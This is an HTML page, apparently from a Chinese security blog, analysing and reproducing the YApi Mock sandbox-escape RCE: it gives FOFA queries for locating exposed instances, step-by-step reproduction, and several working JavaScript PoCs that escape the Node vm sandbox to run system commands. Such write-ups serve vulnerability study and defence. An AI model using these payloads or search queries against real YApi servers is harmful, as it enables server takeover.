@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>003-Yapi Mock RCE 漏洞复现分析 - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="Xavier&#39;s Blog，一个安全工作者的个人空间"><meta name="keywords" content='漏洞分析, vuln'>
+  <meta itemprop="name" content="003-Yapi Mock RCE 漏洞复现分析">
+  <meta itemprop="description" content="Xavier&#39;s Blog，一个安全工作者的个人空间">
+  <meta itemprop="datePublished" content="2021-07-12T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2021-07-12T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2718">
+  <meta itemprop="keywords" content="漏洞分析,Vuln"><meta property="og:url" content="http://localhost:1313/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="003-Yapi Mock RCE 漏洞复现分析">
+  <meta property="og:description" content="Xavier&#39;s Blog，一个安全工作者的个人空间">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-07-12T00:00:00+00:00">
+    <meta property="article:modified_time" content="2021-07-12T00:00:00+00:00">
+    <meta property="article:tag" content="漏洞分析">
+    <meta property="article:tag" content="Vuln">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="003-Yapi Mock RCE 漏洞复现分析">
+  <meta name="twitter:description" content="Xavier&#39;s Blog，一个安全工作者的个人空间">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" title="003-Yapi Mock RCE 漏洞复现分析 - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/" title="002-Nmap进阶学习心得" /><link rel="next" type="text/html" href="http://localhost:1313/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/" title="004-内网渗透 内网信息搜集脑图" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/index.md" title="003-Yapi Mock RCE 漏洞复现分析 - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "003-Yapi Mock RCE 漏洞复现分析",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90\/"
+    },"genre": "posts","keywords": "漏洞分析, vuln","wordcount":  2718 ,
+    "url": "http:\/\/localhost:1313\/posts\/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90\/","datePublished": "2021-07-12T00:00:00+00:00","dateModified": "2021-07-12T00:00:00+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>003-Yapi Mock RCE 漏洞复现分析</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category" title="分类 - 漏洞分析"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 漏洞分析</a></span></div><div class="post-meta-line"><span title="发布于 2021-07-12 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-07-12">2021-07-12</time></span>&nbsp;<span title="2718 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 2800 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 6 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-基本信息">0x01 基本信息</a></li>
+    <li><a href="#0x02-漏洞复现">0x02 漏洞复现</a></li>
+    <li><a href="#0x03-漏洞分析">0x03 漏洞分析</a></li>
+    <li><a href="#0x04-威胁排查">0x04 威胁排查</a></li>
+    <li><a href="#0x05-缓解措施">0x05 缓解措施</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><p>全文共计2314字，预计时长6分钟。</p>
+<p><img loading="lazy" src="/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640.jpeg" alt="图片" srcset="/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640.jpeg?size=small, /posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640.jpeg?size=medium 1.5x, /posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640.jpeg?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 467;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="0x01-基本信息" class="heading-element"><span>0x01 基本信息</span>
+  <a href="#0x01-%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><strong>漏洞名称</strong> : YAPI远程代码执行漏洞</p>
+<p><strong>组件名称</strong> : YAPI</p>
+<p><strong>影响范围</strong> : YAPI &lt;= 1.9.2，</p>
+<p><strong>漏洞类型</strong> :远程代码执行</p>
+<p><strong>利用条件</strong> :</p>
+<p>​	1、用户认证：需要用户认证</p>
+<p>​	2、触发方式：远程</p>
+<p><strong>综合评价 :</strong></p>
+<p>​	&lt;综合评定利用难度&gt;：中等，需要用户认证。</p>
+<p>​	&lt;综合评定威胁等级&gt;：高危，能造成远程代码执行。</p>
+<p>​	YAPI是由去哪儿网移动架构组(简称YMFE，一群由FE、iOS和Android工程师共同组成的具想象力、创造力和影响力的大前端团队)开发的可视化接口管理工具，是一个可本地部署的、打通前后端及QA的接口管理平台。</p>
+<p>​	YAPI旨在为开发、产品和测试人员提供更优雅的接口管理服务，可以帮助开发者轻松创建、发布和维护不同项目，不同平台的API。</p>
+<p>​	YApi 提供了编写JS 脚本方式来提供自定义mock功能，JS脚本运行在NodeJs沙盒上，由于官方的沙盒只是为了隔离上下文，并不提供任何安全保证；mock脚本自定义服务未对JS脚本加以命令过滤，用户可以添加任何请求处理脚本，攻击者可利用该漏洞在受影响的服务器上执行任意javascript代码，通过精心构造的Javascript代码可以绕过沙盒并用于执行任意系统命令，从而导致远程代码执行漏洞，最终导致接管并控制服务器。</p>
+<p>由于Yapi管理平台默认开放注册，攻击者可以在进行简单的注册之后，<strong>构造恶意的JS代码绕过沙盒</strong>，最终造成远程代码执行进行漏洞利用。</p>
+<p>​	问题的本质：功能滥用，JS沙箱绕过导致远程代码执行</p>
+<h2 id="0x02-漏洞复现" class="heading-element"><span>0x02 漏洞复现</span>
+  <a href="#0x02-%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>fofa 搜索语句：</p>
+<blockquote>
+<p>icon_hash=&quot;-715193973&quot;</p>
+<p>app=&ldquo;YApi&rdquo;</p>
+</blockquote>
+<p>本地复现：</p>
+<p>​	Docker搭建测试环境，参考文档：<a href="https://blog.csdn.net/qq_32447301/article/details/81394024"target="_blank" rel="external nofollow noopener noreferrer">《Yapi+Docker的安装与配置》</a></p>
+<p><img loading="lazy" src="/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803801.png" alt="图片" srcset="/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803801.png?size=small, /posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803801.png?size=medium 1.5x, /posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803801.png?size=large 2x" data-title="图片" style="--width: 786px;--aspect-ratio: 786 / 968;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>​	创建完容器之后就可以使用了。</p>
+<ol>
+<li>在首页下方找到登录/注册功能接口，或直接访问 /login 路径进行登录和注册。</li>
+<li>登录之后进入个人空间，在右侧点击添加项目；</li>
+<li>添加成功后进入项目，点击右侧同一位置有个“添加接口”</li>
+<li>添加完之后，打开接口，进入“高级Mock”功能，点击脚本，输入Poc，点击保存即可。</li>
+<li>点击“预览”，访问Mock地址，即可触发漏洞POC。</li>
+</ol>
+<p><img loading="lazy" src="/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803366.png" alt="图片" srcset="/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803366.png?size=small, /posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803366.png?size=medium 1.5x, /posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803366.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 580;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>POC如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">const</span> <span class="n">process</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">constructor</span><span class="o">.</span><span class="n">constructor</span><span class="p">(</span><span class="s1">&#39;return process&#39;</span><span class="p">)()</span><span class="n">mockJson</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">mainModule</span><span class="o">.</span><span class="n">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">execSync</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>点击“预览”，访问Mock地址，即可触发漏洞POC：</p>
+<p><img loading="lazy" src="/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803369.png" alt="图片" srcset="/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803369.png?size=small, /posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803369.png?size=medium 1.5x, /posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803369.png?size=large 2x" data-title="图片" style="--width: 769px;--aspect-ratio: 769 / 215;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="0x03-漏洞分析" class="heading-element"><span>0x03 漏洞分析</span>
+  <a href="#0x03-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>​	这个漏洞的利用条件首先需要用户通过认证，而YAPI 支持任意用户的注册功能，</p>
+<p>​	注册之后的用户虽然没有任何分组与项目的权限，因此只能搜索、浏览 “公开项目” 的接口。但是新用户登录拥有 <code>个人空间</code> 分组下的<strong>全部权限</strong>，个人空间分组仅自己可见，因此可以在这里<strong>任意试用 YApi 的功能</strong>。</p>
+<p>​	这里也就包括了高级Mock功能，该功能的本意是方便用户编写自己的JS脚本，该脚本将会运行在NodeJS沙盒上，但是NodeJS沙盒并不提供安全保证。关于JS沙箱的安全问题早有探讨。（见 《说说JS中的沙箱》——腾讯IVWEB团队）</p>
+<p>​	NodeJS中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"> <span class="k">const</span> <span class="n">vm</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span> <span class="k">const</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="k">const</span> <span class="n">sandbox</span> <span class="o">=</span> <span class="p">{</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">};</span> <span class="n">vm</span><span class="o">.</span><span class="n">createContext</span><span class="p">(</span><span class="n">sandbox</span><span class="p">);</span>  <span class="o">//</span><span class="n">Contextify</span> <span class="n">the</span> <span class="n">sandbox</span><span class="o">.</span>  <span class="k">const</span> <span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;x += 40;var y=17;&#39;</span><span class="p">;</span> <span class="n">vm</span><span class="o">.</span><span class="n">runInContext</span><span class="p">(</span><span class="n">code</span><span class="p">,</span><span class="n">sandbox</span><span class="p">);</span> <span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="n">sandbox</span><span class="o">.</span><span class="n">x</span><span class="p">);</span>  <span class="o">//</span> <span class="mi">42</span> <span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="n">sandbox</span><span class="o">.</span><span class="n">y</span><span class="p">);</span>  <span class="o">//</span> <span class="mi">17</span> <span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="n">x</span><span class="p">);</span><span class="o">//</span> <span class="mi">1</span><span class="p">;</span> <span class="n">y</span> <span class="n">is</span> <span class="ow">not</span> <span class="n">defined</span><span class="o">.</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。</p>
+<p>​	可惜的是 如果这样，我们可以用原型链绕过，如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"> <span class="k">const</span> <span class="n">vm</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>   <span class="n">vm</span><span class="o">.</span><span class="n">runInNewContext</span><span class="p">(</span><span class="s2">&#34;this.constructor.constructor(&#39;return process&#39;)().exit()&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	网上关于NodeJS、沙箱一类的安全技术研究也有很多，可以参考下学一学。</p>
+<p>​	回到这个漏洞，已知Mock脚本会在沙箱中运行，那么我们只需要利用类似上面的原型链进行绕过，退出沙箱，再构造调用命令即可。</p>
+<p>Poc：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"> <span class="k">const</span> <span class="n">process</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">constructor</span><span class="o">.</span><span class="n">constructor</span><span class="p">(</span><span class="s1">&#39;return process&#39;</span><span class="p">)()</span> <span class="n">mockJson</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">mainModule</span><span class="o">.</span><span class="n">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">execSync</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	注意，这里不需要加 exit，加了以后yapi服务会退出。</p>
+<p>网上的Poc其实表达的意思是一样的，如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"> <span class="k">const</span> <span class="n">sandbox</span> <span class="o">=</span> <span class="n">this</span> <span class="k">const</span> <span class="n">ObjectConstructor</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">constructor</span> <span class="k">const</span> <span class="n">FunctionConstructor</span> <span class="o">=</span> <span class="n">ObjectConstructor</span><span class="o">.</span><span class="n">constructor</span> <span class="k">const</span> <span class="n">myfun</span> <span class="o">=</span> <span class="n">FunctionConstructor</span><span class="p">(</span><span class="s1">&#39;return process&#39;</span><span class="p">)</span> <span class="k">const</span> <span class="n">process</span> <span class="o">=</span> <span class="n">myfun</span><span class="p">()</span> <span class="n">mockJson</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">mainModule</span><span class="o">.</span><span class="n">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">execSync</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>我认为这个问题的本质是功能的滥用，JS沙箱绕过导致远程代码执行。之前看了一个文档《nodejs命令执行和沙箱安全》，他所说的内容有对也有不对的地方。</p>
